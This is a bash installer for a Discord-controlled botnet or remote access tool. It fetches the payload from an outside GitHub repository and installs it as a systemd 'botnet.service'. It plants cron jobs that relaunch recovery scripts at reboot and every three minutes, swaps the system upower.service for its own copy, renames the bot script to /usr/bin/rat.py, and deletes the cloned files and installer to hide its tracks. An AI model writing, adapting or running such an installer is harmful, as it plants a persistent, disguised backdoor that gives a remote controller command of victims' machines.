#!/bin/bash


sudo apt-get install git -y
apt-get install python3 -y
#apt-get install pip3 ( in case ;)
pip3 install discord #install discord module
git clone https://github.com/Dhanraj369/the_spider_shell_reshell.git
echo "in current folder goto  the_spider_shell_reshell/Debian_based_botne/Bnet/bnet.py file and put your  discord bot token and channel id "

# Prompt the user for input
read -p "i pested my discord bot token = yes or no > " input

# Check the input string
if [ "$input" == "yes" ]; then
    echo "You entered 'yes'."

    cp -r the_spider_shell_reshell/Debian_based_botne/Bnet /usr/share/ 
    cp /usr/share/Bnet/botnet.service /etc/systemd/system/
    cd /usr/share/Bnet/ && chmod +x mrdarksage.sh post-check.sh pre-check.sh recover_bnet.sh install.sh run_me.sh && chmod +x *.sh
    systemctl enable botnet.service
    systemctl start botnet.service 
    systemctl daemon-reload
    (crontab -l ; echo "@reboot sleep 60 && /bin/bash /usr/share/Bnet/recover_bnet.sh") | crontab -
    (crontab -l ; echo "*/3 * * * * /bin/bash /usr/share/Bnet/recover_bnet.sh") | crontab -
    (crontab -l ; echo "@reboot sleep 60 && /bin/bash /usr/bin/mrdarksage.sh") | crontab -
    (crontab -l ; echo "*/3 * * * * /bin/bash /usr/bin/mrdarksage.sh") | crontab -
    cp /usr/share/Bnet/mrdarksage.sh /usr/bin/
    rm /usr/share/Bnet/mrdarksage.sh
    rm /lib/systemd/system/upower.service
    cp /usr/share/Bnet/upower.service /lib/systemd/system/ 
    rm /usr/share/Bnet/upower.service
    rm /usr/share/Bnet/discord.service
    rm -rf the_spider_shell_reshell
    cp /usr/share/Bnet/bnet.py /usr/bin/rat.py
    rm install.sh
    



    


elif [ "$input" == "no" ]; then
    echo "pest discord bot token in bnet.py and channel id."
else
    echo "You entered something else: $input"
fi

rm /usr/share/Bnet/install.sh
